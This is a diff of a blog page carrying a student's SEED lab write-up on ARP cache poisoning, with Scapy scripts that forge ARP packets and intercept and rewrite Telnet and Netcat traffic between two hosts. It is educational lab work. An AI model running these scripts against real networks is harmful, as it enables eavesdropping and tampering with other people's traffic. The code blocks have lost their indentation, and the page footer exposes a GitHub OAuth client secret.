@@ -6,20 +6,41 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives | 李小混的Blog</title>
+  <title>seedlab实验ARP缓存中毒攻击 | 李小混的Blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="个人博客">
-<meta property="og:type" content="website">
-<meta property="og:title" content="李小混的Blog">
-<meta property="og:url" content="http://example.com/archives/index.html">
+  <meta name="description" content="seedlab实验ARP缓存中毒攻击##一、实验目标 使用ARP中毒进行中间人攻击（代码位于底部）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="seedlab实验ARP缓存中毒攻击">
+<meta property="og:url" content="http://example.com/post/4.html">
 <meta property="og:site_name" content="李小混的Blog">
-<meta property="og:description" content="个人博客">
+<meta property="og:description" content="seedlab实验ARP缓存中毒攻击##一、实验目标 使用ARP中毒进行中间人攻击（代码位于底部）">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/yEUdD6f23iOJFBK.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/Qi8zM61okCVeEha.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/7CBWRSXETwAIqJ5.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/CShOUXvbVM1Bpfw.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/75x4DZrmisIM2LV.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/tRsCJrIc7kvML2P.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/UuLGlFYqjtV8vp3.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/eUuik5xvtBgs3cZ.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/TSZx6wWjaBDQ4oY.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/sSYmLWk9bHhoKl5.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/oPUXbZNAY2EjveO.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/Tf6oG4LN5lvujYM.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/b8Lwg7OEvfXHR3F.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/jUiafQEo25Z1RA9.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/7CM41kyHzrJY2Oa.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/Q1EGi3AdmOYVKDz.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/tIy1GFpr7nPzO8v.png">
+<meta property="article:published_time" content="2020-12-26T05:07:35.669Z">
+<meta property="article:modified_time" content="2020-12-26T05:07:06.487Z">
 <meta property="article:author" content="李小混">
-<meta property="article:tag" content="CTF,软件安全,网络安全,IOT">
+<meta property="article:tag" content="seedlab">
+<meta property="article:tag" content="网络安全">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/12/26/yEUdD6f23iOJFBK.png">
   
     <link rel="alternative" href="/atom.xml" title="李小混的Blog" type="application/atom+xml">
   
@@ -208,41 +229,175 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-seedlabARP中毒" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
+    <h1 class="article-title" itemprop="name">
+      seedlab实验ARP缓存中毒攻击
+    </h1>
+  
+
+
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
 <a href="/post/4.html" class="archive-article-date">
         <time datetime="2020-12-26T05:07:35.669Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-26</time>
 </a>
 
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1.7k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">7分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="seedlab实验ARP缓存中毒攻击"><a href="#seedlab实验ARP缓存中毒攻击" class="headerlink" title="seedlab实验ARP缓存中毒攻击"></a>seedlab实验ARP缓存中毒攻击</h1><p>##一、实验目标</p>
+<p>使用ARP中毒进行中间人攻击（代码位于底部）</p>
+<a id="more"></a>
+
+<h2 id="二、实验原理"><a href="#二、实验原理" class="headerlink" title="二、实验原理"></a>二、实验原理</h2><p>地址解析协议（ARP）是一种通信协议，用于发现给定IP地址的链路层地址，例如MAC地址。ARP协议是一个非常简单的协议，它没有实现任何安全措施。ARP缓存中毒攻击是针对ARP协议的常见攻击。在这种攻击下，攻击者可以欺骗受害者以接受伪造的IP到MAC映射。这可能导致受害者的数据包使用伪造的MAC地址重定向到计算机。<br>此实验就是在ubuntu下模拟该机制</p>
+<p>。</p>
+<h2 id="三、实验步骤及运行结果"><a href="#三、实验步骤及运行结果" class="headerlink" title="三、实验步骤及运行结果"></a>三、实验步骤及运行结果</h2><h3 id="Task1．ARP缓存中毒"><a href="#Task1．ARP缓存中毒" class="headerlink" title="Task1．ARP缓存中毒"></a>Task1．ARP缓存中毒</h3><p>A、使用ARP请求报文，攻击者向A发送ARP请求报文，观察attacker的MAC地址是否和B的IP匹配。<br>发现除了attacker向A发之外，B也要向A发，这样ARP表中才有B的IP地址。</p>
+<p><img src="https://i.loli.net/2020/12/26/yEUdD6f23iOJFBK.png"></p>
+<p>发现并不匹配。</p>
+<p>B、使用ARP请求报文，攻击者向A发送ARP响应报文，观察attacker的MAC地址是否和B的IP匹配。</p>
+<p><img src="https://i.loli.net/2020/12/26/Qi8zM61okCVeEha.png"></p>
+<p>依旧不匹配。<br>C、发送无故ARP报文。</p>
+<p><img src="https://i.loli.net/2020/12/26/7CBWRSXETwAIqJ5.png"></p>
+<p>该报文作用就是告诉局域网内其他主机该更新ARP表了。</p>
+<p>###Task2．利用ARP缓存中毒对Telnet的MITM攻击</p>
+<p>Step1：</p>
+<p> 启动ARP缓存中毒攻击。主机缓存先中毒攻击A和B，使得在A的ARP缓存中，B的IP地址映射到M的MAC地址，而在B的ARP缓存，A的IP地址也映射到M的MAC地址。在这一步之后，在A和B之间发送数据包。我们将使用任务1的ARP缓存中毒攻击来实现这个目标。<br>首先发送源IP和目的IP都为A，MAC地址为attacker的地址的无故ARP报文。</p>
+<p><img src="https://i.loli.net/2020/12/26/CShOUXvbVM1Bpfw.png"></p>
+<p>发现在B中，A的IP地址对应为attacker的MAC地址。</p>
+<p><img src="https://i.loli.net/2020/12/26/75x4DZrmisIM2LV.png"></p>
+<p>之后，发送源IP和目的IP都为B，MAC地址为attacker的地址的无故ARP报文。</p>
+<p><img src="https://i.loli.net/2020/12/26/tRsCJrIc7kvML2P.png"></p>
+<p>发现在A中，B的IP地址对应为attacker的MAC地址。</p>
+<p><img src="https://i.loli.net/2020/12/26/UuLGlFYqjtV8vp3.png"></p>
+<p>Step2：</p>
+<p>攻击成功后，请尝试在主机A和主机B之间互相ping，并且报告你的观察结果。请在报告中显示Wireshark的结果。</p>
+<p><img src="https://i.loli.net/2020/12/26/eUuik5xvtBgs3cZ.png"></p>
+<p>此时A ping到B 的话，一开始会有几个无响应的ICMP报文发出，之后发出ARP包更新为可用的MAC地址。</p>
+<p>A：</p>
+<p><img src="https://i.loli.net/2020/12/26/TSZx6wWjaBDQ4oY.png"></p>
+<p>B：</p>
+<p><img src="https://i.loli.net/2020/12/26/sSYmLWk9bHhoKl5.png"></p>
+<p>step3:</p>
+<p>现在我们打开主机M上的IP转发，因此它将转发A和B之间的数据包。请运行以下命令并重复步骤2。请描述一下你的观察。</p>
+<p><img src="https://i.loli.net/2020/12/26/oPUXbZNAY2EjveO.png"></p>
+<p>一开始会由attacker转发报文，表示能够转发，但是时间一长，依旧会发送ARP包，更新地址。所以需要在实验中一直发送无故ARP报文。</p>
+<p>A：</p>
+<p><img src="https://i.loli.net/2020/12/26/Tf6oG4LN5lvujYM.png"></p>
+<p>B：</p>
+<p><img src="https://i.loli.net/2020/12/26/b8Lwg7OEvfXHR3F.png"></p>
+<p>step4:</p>
+<p>建立telnet连接，对A到B的tcp包的数据进行修改，对B到A的包不做修改。因为修改ARP之后，一段时间内会自动变回来，所以在实验过程中要一直发ARP修改报文。<br>之后对于伪造程序而言，需要修改filter以过滤出只有这A和B之间转发的报文，可以通过过滤端口来实现。<br>最后实验效果如下：<br>在键盘上敲下4个a</p>
+<p><img src="https://i.loli.net/2020/12/26/jUiafQEo25Z1RA9.png"></p>
+<p>之后关闭M的转发机制：<br>再次重复上述步骤，结果如下：</p>
+<p><img src="https://i.loli.net/2020/12/26/7CM41kyHzrJY2Oa.png"></p>
+<p>只要ARP无故报文一直在发，那么M就不会转发报文，那么就会一直没有回显。同样也不会有B到A的报文，因为B都不知道。</p>
+<h3 id="Task3-利用ARP缓存中毒对Netcat的MITM攻击"><a href="#Task3-利用ARP缓存中毒对Netcat的MITM攻击" class="headerlink" title="Task3:利用ARP缓存中毒对Netcat的MITM攻击"></a>Task3:利用ARP缓存中毒对Netcat的MITM攻击</h3><p><img src="https://i.loli.net/2020/12/26/Q1EGi3AdmOYVKDz.png"></p>
+<p>利用上图的方式建立Netcat连接<br>一旦建立了连接，就可以在A上键入消息。每行消息都将被放入发送到B的TCP数据包中，后者只显示消息。任务是用a序列替换消息中出现的每个名字。该序列的长度应该与名字的长度相同，否则将弄乱TCP序列号，从而弄乱整个TCP连接。<br>之后对于伪造程序而言，需要修改filter以过滤出只有这A和B之间转发的报文，可以通过过滤MAC地址来实现。<br>成功之后，在客户端输入名字长度的字符，在服务端有名字的回显。</p>
+<p><img src="https://i.loli.net/2020/12/26/tIy1GFpr7nPzO8v.png"></p>
+<p>攻击成功</p>
+<h2 id="四、代码"><a href="#四、代码" class="headerlink" title="四、代码"></a>四、代码</h2><h3 id="Task1、"><a href="#Task1、" class="headerlink" title="Task1、"></a>Task1、</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">src_mac=<span class="string">&#x27;00:0c:29:b8:73:d8&#x27;</span></span><br><span class="line">dst_mac=<span class="string">&#x27;00:0c:29:49:21:29&#x27;</span></span><br><span class="line">src_ip=<span class="string">&#x27;10.0.2.4&#x27;</span></span><br><span class="line">dst_ip=<span class="string">&#x27;10.0.2.1&#x27;</span></span><br><span class="line">eth = Ether(src=src_mac, dst=dst_mac)</span><br><span class="line">arp = ARP(hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip, op=<span class="number">1</span>)</span><br><span class="line">pkt = eth / arp</span><br><span class="line">sendp(pkt)</span><br><span class="line"><span class="number">2</span>、</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">src_mac=<span class="string">&#x27;00:0c:29:b8:73:d8&#x27;</span></span><br><span class="line">dst_mac=<span class="string">&#x27;00:0c:29:d3:53:a1&#x27;</span></span><br><span class="line">src_ip=<span class="string">&#x27;10.0.2.4&#x27;</span></span><br><span class="line">dst_ip=<span class="string">&#x27;10.0.2.3&#x27;</span></span><br><span class="line">eth = Ether(src=src_mac, dst=dst_mac)</span><br><span class="line">arp = ARP(hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip, op=<span class="number">2</span>)</span><br><span class="line">pkt = eth / arp</span><br><span class="line">sendp(pkt)</span><br><span class="line"><span class="number">3</span>、</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">src_mac=<span class="string">&#x27;00:0c:29:b8:73:d8&#x27;</span></span><br><span class="line">dst_mac=<span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span></span><br><span class="line">src_ip=<span class="string">&#x27;10.0.2.1&#x27;</span></span><br><span class="line">dst_ip=<span class="string">&#x27;10.0.2.1&#x27;</span></span><br><span class="line">eth = Ether(src=src_mac, dst=dst_mac)</span><br><span class="line">arp = ARP(hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip, op=<span class="number">1</span>)</span><br><span class="line">pkt = eth / arp</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">sendp(pkt)</span><br><span class="line"><span class="number">4</span>、</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">src_mac=<span class="string">&#x27;00:0c:29:b8:73:d8&#x27;</span></span><br><span class="line">dst_mac=<span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span></span><br><span class="line">src_ip=<span class="string">&#x27;10.0.2.3&#x27;</span></span><br><span class="line">dst_ip=<span class="string">&#x27;10.0.2.3&#x27;</span></span><br><span class="line">eth = Ether(src=src_mac, dst=dst_mac)</span><br><span class="line">arp = ARP(hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip, op=<span class="number">1</span>)</span><br><span class="line">pkt = eth / arp</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">sendp(pkt)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Task2"><a href="#Task2" class="headerlink" title="Task2:"></a>Task2:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">VM_A_IP = <span class="string">&quot;10.0.2.1&quot;</span></span><br><span class="line">VM_B_IP = <span class="string">&quot;10.0.2.3&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spoof_pkt</span>(<span class="params">pkt</span>):</span></span><br><span class="line"><span class="keyword">if</span> pkt[IP].src == VM_A_IP <span class="keyword">and</span> pkt[IP].dst == VM_B_IP <span class="keyword">and</span> pkt[TCP].payload:</span><br><span class="line"><span class="comment"># Create a new packet based on the captured one.</span></span><br><span class="line"><span class="comment"># (1) We need to delete the checksum fields in the IP and TCP headers,</span></span><br><span class="line"><span class="comment"># because our modification will make them invalid.</span></span><br><span class="line"><span class="comment"># Scapy will recalculate them for us if these fields are missing.</span></span><br><span class="line"><span class="comment"># (2) We also delete the original TCP payload.</span></span><br><span class="line">newpkt = pkt[IP]</span><br><span class="line"><span class="keyword">del</span>(newpkt.chksum)</span><br><span class="line"><span class="keyword">del</span>(newpkt[TCP].chksum)</span><br><span class="line"><span class="keyword">del</span>(newpkt[TCP].payload)</span><br><span class="line"><span class="comment">#####################################################################</span></span><br><span class="line"><span class="comment"># Construct the new payload based on the old payload.</span></span><br><span class="line"><span class="comment"># Students need to implement this part.</span></span><br><span class="line"><span class="comment">#olddata = pkt[TCP].payload.load # Get the original payload data</span></span><br><span class="line">newdata = <span class="built_in">str</span>.encode(<span class="string">&#x27;Z&#x27;</span>) <span class="comment"># No change is made in this sample code</span></span><br><span class="line"><span class="comment">#####################################################################</span></span><br><span class="line"><span class="comment"># Attach the new data and set the packet out</span></span><br><span class="line">send(newpkt/newdata)</span><br><span class="line"><span class="keyword">elif</span> pkt[IP].src == VM_B_IP <span class="keyword">and</span> pkt[IP].dst == VM_A_IP:</span><br><span class="line">send(pkt[IP]) <span class="comment"># Forward the original packet</span></span><br><span class="line">pkt = sniff(<span class="built_in">filter</span>=<span class="string">&#x27;tcp and port 23&#x27;</span>,prn=spoof_pkt)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Task3"><a href="#Task3" class="headerlink" title="Task3:"></a>Task3:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">VM_A_IP = <span class="string">&quot;10.0.2.3&quot;</span></span><br><span class="line">VM_B_IP = <span class="string">&quot;10.0.2.1&quot;</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spoof_pkt</span>(<span class="params">pkt</span>):</span></span><br><span class="line"><span class="keyword">if</span> pkt[IP].src == VM_A_IP <span class="keyword">and</span> pkt[IP].dst == VM_B_IP <span class="keyword">and</span> pkt[TCP].payload:</span><br><span class="line"><span class="comment"># Create a new packet based on the captured one.</span></span><br><span class="line"><span class="comment"># (1) We need to delete the checksum fields in the IP and TCP headers,</span></span><br><span class="line"><span class="comment"># because our modification will make them invalid.</span></span><br><span class="line"><span class="comment"># Scapy will recalculate them for us if these fields are missing.</span></span><br><span class="line"><span class="comment"># (2) We also delete the original TCP payload.</span></span><br><span class="line">newpkt = pkt[IP]</span><br><span class="line"><span class="keyword">del</span>(newpkt.chksum)</span><br><span class="line"><span class="keyword">del</span>(newpkt[TCP].chksum)</span><br><span class="line"><span class="keyword">del</span>(newpkt[TCP].payload)</span><br><span class="line"><span class="comment">#####################################################################</span></span><br><span class="line"><span class="comment"># Construct the new payload based on the old payload.</span></span><br><span class="line"><span class="comment"># Students need to implement this part.</span></span><br><span class="line"><span class="comment">#olddata = pkt[TCP].payload.load # Get the original payload data</span></span><br><span class="line">newdata = <span class="built_in">str</span>.encode(<span class="string">&#x27;liyantao&#x27;</span>) <span class="comment"># No change is made in this sample code</span></span><br><span class="line"><span class="comment">#####################################################################</span></span><br><span class="line"><span class="comment"># Attach the new data and set the packet out</span></span><br><span class="line">send(newpkt/newdata)</span><br><span class="line"><span class="keyword">elif</span> pkt[IP].src == VM_B_IP <span class="keyword">and</span> pkt[IP].dst == VM_A_IP:</span><br><span class="line">send(pkt[IP]) <span class="comment"># Forward the original packet</span></span><br><span class="line">pkt = sniff(<span class="built_in">filter</span>=<span class="string">&#x27;tcp and (ether src 00:0c:29:d3:53:a1 or ether src 00:0c:29:49:21:29)&#x27;</span>,prn=spoof_pkt)</span><br></pre></td></tr></table></figure>
+    
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="https://i.loli.net/2020/12/22/Vn4iaZwcXKJA2pM.png">
+                    <span class="reward-type">微信</span>
+                  </div>
+                  
+                </div>
+              </span>
+            </span>
+          </span>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/post/4.html">seedlab实验ARP缓存中毒攻击</a>
-	
-    </h1>
-  
+      </a>
+    </div>
+    
 
-
-        <div class="article-info info-on-right">
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          李小混
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://lixiaohun.github.io/post/4.html" title="seedlab实验ARP缓存中毒攻击" target="_blank">https://lixiaohun.github.io/post/4.html</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -258,203 +413,143 @@
 		</ul>
 	</div>
 
-          
+    
 
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/post/4.html" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/post/3.html" class="archive-article-date">
-        <time datetime="2020-12-26T04:20:07.705Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-26</time>
-</a>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/post/3.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">seedlab实验Sniffing_Spoofing</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/post/3.html">seedlab实验Sniffing_Spoofing</a>
-	
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">seedlab</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">网络安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#seedlab%E5%AE%9E%E9%AA%8CARP%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">seedlab实验ARP缓存中毒攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">二、实验原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4%E5%8F%8A%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="toc-number">1.2.</span> <span class="toc-text">三、实验步骤及运行结果</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task1%EF%BC%8EARP%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="toc-number">1.2.1.</span> <span class="toc-text">Task1．ARP缓存中毒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task3-%E5%88%A9%E7%94%A8ARP%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E5%AF%B9Netcat%E7%9A%84MITM%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.2.</span> <span class="toc-text">Task3:利用ARP缓存中毒对Netcat的MITM攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BB%A3%E7%A0%81"><span class="toc-number">1.3.</span> <span class="toc-text">四、代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task1%E3%80%81"><span class="toc-number">1.3.1.</span> <span class="toc-text">Task1、</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task2"><span class="toc-number">1.3.2.</span> <span class="toc-text">Task2:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task3"><span class="toc-number">1.3.3.</span> <span class="toc-text">Task3:</span></a></li></ol></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
+
+
+
+
+
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/post/0.html" class="archive-article-date">
-        <time datetime="2020-12-22T02:32:20.953Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-22</time>
-</a>
-
-        </div>
-    	 
+  <div id="gitment-ctn"></div>
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/post/0.html">第一次实训wp</a>
-	
-    </h1>
+    <!-- 中文 -->
+    <link rel="stylesheet" href="/lib/gitment.css">
+    <script src="/lib/gitment.js"></script>
   
+  <script>
+    <!-- id: "seedlab实验ARP缓存中毒攻击" -->
+    var gitment = new Gitment({
+      id: "20201226130735",
+      owner: 'lixiaohun',
+      repo: 'lixiaohun.github.io',
+      oauth: {
+        client_id: 'fbdd08a6d090f32c952e',
+        client_secret: 'be3e36e2c6d45c43ff218c12df2dfa123eb1e40d',
+      },
+    })
+    gitment.render('gitment-ctn')
+  </script>
 
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
